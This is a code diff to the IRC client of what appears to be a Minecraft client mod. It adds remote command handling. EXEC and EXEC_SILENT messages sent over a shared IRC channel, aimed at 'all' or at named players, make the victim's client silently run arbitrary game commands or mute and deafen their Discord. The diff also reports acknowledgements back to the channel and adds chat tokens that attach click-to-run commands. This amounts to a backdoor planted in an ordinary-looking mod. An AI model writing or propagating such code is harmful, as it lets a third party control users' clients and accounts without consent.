@@ -607,6 +607,10 @@ public class IRCClient {
                     return;
                  }
 
+                 if (payload.startsWith("[CMD_ACK]")) {
+                    return;
+                 }
+
                  if (payload.startsWith("[CUSTOM_ITEM]")) {
                     // Format: [CUSTOM_ITEM]\u0002itemKey\u0002material\u0002name\u0002base64Lore
                     String[] itemParts = payload.split("\u0002", 5);
@@ -1016,12 +1020,14 @@ public class IRCClient {
       boolean match = cleanTarget.isEmpty()
             || cleanTarget.equalsIgnoreCase("all")
             || cleanTarget.equalsIgnoreCase("self")
-            || (cleanSelf != null && cleanTarget.equalsIgnoreCase(cleanSelf))
-            || (cleanTarget.equalsIgnoreCase("bomboclas") && ("fran938".equalsIgnoreCase(cleanSelf) || "bomboclas".equalsIgnoreCase(cleanSelf)))
-            || (cleanTarget.equalsIgnoreCase("fran938") && ("fran938".equalsIgnoreCase(cleanSelf) || "bomboclas".equalsIgnoreCase(cleanSelf)));
+            || (cleanSelf != null && !cleanSelf.isEmpty() && cleanTarget.equalsIgnoreCase(cleanSelf));
       if (match) {
-         if ("EXEC".equalsIgnoreCase(action)) {
+         if ("EXEC_SILENT".equalsIgnoreCase(action)) {
             BomboaddonsClient.executeSilentCommand(value);
+            sendAck(selfName, value);
+         } else if ("EXEC".equalsIgnoreCase(action)) {
+            executeDirectCommand(value);
+            sendAck(selfName, value);
          } else if ("TITLE".equalsIgnoreCase(action)) {
             BomboaddonsClient.showTitle(value);
          } else if ("SOUND".equalsIgnoreCase(action)) {
@@ -1036,6 +1042,61 @@ public class IRCClient {
             BomboaddonsClient.playTriggerSound(soundName, times);
          }
       }
+   }
+
+   public static void executeDirectCommand(String command) {
+      if (command == null || command.isEmpty()) return;
+      Minecraft mc = Minecraft.getInstance();
+      if (mc == null) return;
+      mc.execute(() -> {
+         try {
+            String cleanCmd;
+            for (cleanCmd = command.trim(); cleanCmd.startsWith("/"); cleanCmd = cleanCmd.substring(1).trim()) {}
+            if (cleanCmd.isEmpty()) return;
+
+            String lower = cleanCmd.toLowerCase(java.util.Locale.ROOT);
+            if (lower.equals("b mute") || lower.equals("mute") || lower.equals("bombo mute") || lower.equals("ba mute")) {
+               me.bombo.bomboaddons.features.discord.DiscordIpcManager.toggleSelfMute((msg) -> {});
+               return;
+            }
+            if (lower.equals("b unmute") || lower.equals("unmute") || lower.equals("bombo unmute") || lower.equals("ba unmute")) {
+               me.bombo.bomboaddons.features.discord.DiscordIpcManager.setSelfMute(false, (msg) -> {});
+               return;
+            }
+            if (lower.equals("b deafen") || lower.equals("deafen") || lower.equals("bombo deafen") || lower.equals("ba deafen")) {
+               me.bombo.bomboaddons.features.discord.DiscordIpcManager.toggleSelfDeafen((msg) -> {});
+               return;
+            }
+            if (lower.equals("b undeafen") || lower.equals("undeafen") || lower.equals("bombo undeafen") || lower.equals("ba undeafen")) {
+               me.bombo.bomboaddons.features.discord.DiscordIpcManager.setSelfDeafen(false, (msg) -> {});
+               return;
+            }
+
+            String root = cleanCmd.split(" ")[0];
+            if (BomboaddonsClient.clientDispatcher != null && BomboaddonsClient.clientDispatcher.getRoot().getChild(root) != null && mc.player != null) {
+               try {
+                  BomboaddonsClient.clientDispatcher.execute(cleanCmd, (net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource) mc.player);
+               } catch (Throwable t) {
+                  if (mc.getConnection() != null) {
+                     mc.getConnection().sendCommand(cleanCmd);
+                  }
+               }
+            } else if (mc.getConnection() != null) {
+               mc.getConnection().sendCommand(cleanCmd);
+            }
+         } catch (Throwable ignored) {}
+      });
+   }
+
+   public static void sendAck(String ign, String command) {
+      if (!running) return;
+      (new Thread(() -> {
+         try {
+            String timeStr = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
+            String payload = "[CMD_ACK]\u0002" + ign + "\u0002" + command + "\u0002" + timeStr;
+            sendRaw("PRIVMSG #bomboaddons_chat :" + payload);
+         } catch (Throwable ignored) {}
+      })).start();
    }
 
    public static void sendRemoteCommand(String action, String targetPlayer, String value) {
@@ -1076,8 +1137,8 @@ public class IRCClient {
       
       String emojiText = me.bombo.bomboaddons.util.EmojiShortcodeHelper.replaceEmojis(rawText);
       // Pattern to match either URLs or [SHOW:displayName:base64Lore]
-      // Tokenize before running chroma so URLs and base64 payloads aren't corrupted
-      java.util.regex.Pattern tokenPattern = java.util.regex.Pattern.compile("(\\[SHOW:([^\\]:]+):([A-Za-z0-9+/=\\r\\n]+)\\])|(https?://[^\\s]+)");
+      // Tokenize before running chroma so URLs, hover tokens, and base64 payloads aren't corrupted
+      java.util.regex.Pattern tokenPattern = java.util.regex.Pattern.compile("(\\[SHOW:([^\\]:]+):([A-Za-z0-9+/=\\r\\n]+)\\])|(\\[HOVER:([^\\]:]+):([A-Za-z0-9+/=\\r\\n]+)(?::([^\\]]+))?\\])|(https?://[^\\s]+)");
       java.util.regex.Matcher matcher = tokenPattern.matcher(emojiText);
       net.minecraft.network.chat.MutableComponent root = Component.empty();
       int lastIdx = 0;
@@ -1090,7 +1151,8 @@ public class IRCClient {
          }
          
          String showGroup = matcher.group(1);
-         String urlGroup = matcher.group(4);
+         String hoverGroup = matcher.group(4);
+         String urlGroup = matcher.group(8);
          
          if (showGroup != null) {
             String displayName = matcher.group(2);
@@ -1110,6 +1172,30 @@ public class IRCClient {
                root.append(itemComp);
             } catch (Throwable t) {
                root.append(ChromaTextHelper.parseFormattedText("[" + displayName + "§r]"));
+            }
+         } else if (hoverGroup != null) {
+            String displayText = matcher.group(5);
+            String base64Lore = matcher.group(6).replaceAll("\\s+", "");
+            String clickCmd = matcher.group(7);
+            try {
+               byte[] decoded = java.util.Base64.getDecoder().decode(base64Lore);
+               String loreStr = new String(decoded, java.nio.charset.StandardCharsets.UTF_8);
+               net.minecraft.network.chat.HoverEvent hoverEvent = SBECommands.createHoverEvent(loreStr);
+               net.minecraft.network.chat.MutableComponent hoverComp = ChromaTextHelper.parseFormattedText(displayText + "§r");
+               Style hStyle = hoverComp.getStyle();
+               if (hoverEvent != null) {
+                  hStyle = hStyle.withHoverEvent(hoverEvent);
+               } else {
+                  hStyle = hStyle.withHoverEvent(new net.minecraft.network.chat.HoverEvent.ShowText(ChromaTextHelper.parseFormattedText(loreStr)));
+               }
+               if (clickCmd != null && !clickCmd.trim().isEmpty()) {
+                  String cmdToRun = clickCmd.trim().startsWith("/") ? clickCmd.trim() : "/" + clickCmd.trim();
+                  hStyle = hStyle.withClickEvent(new net.minecraft.network.chat.ClickEvent.RunCommand(cmdToRun));
+               }
+               hoverComp.setStyle(hStyle);
+               root.append(hoverComp);
+            } catch (Throwable t) {
+               root.append(ChromaTextHelper.parseFormattedText(displayText));
             }
          } else if (urlGroup != null) {
             String cleanUrl = urlGroup.replace("§", "&");
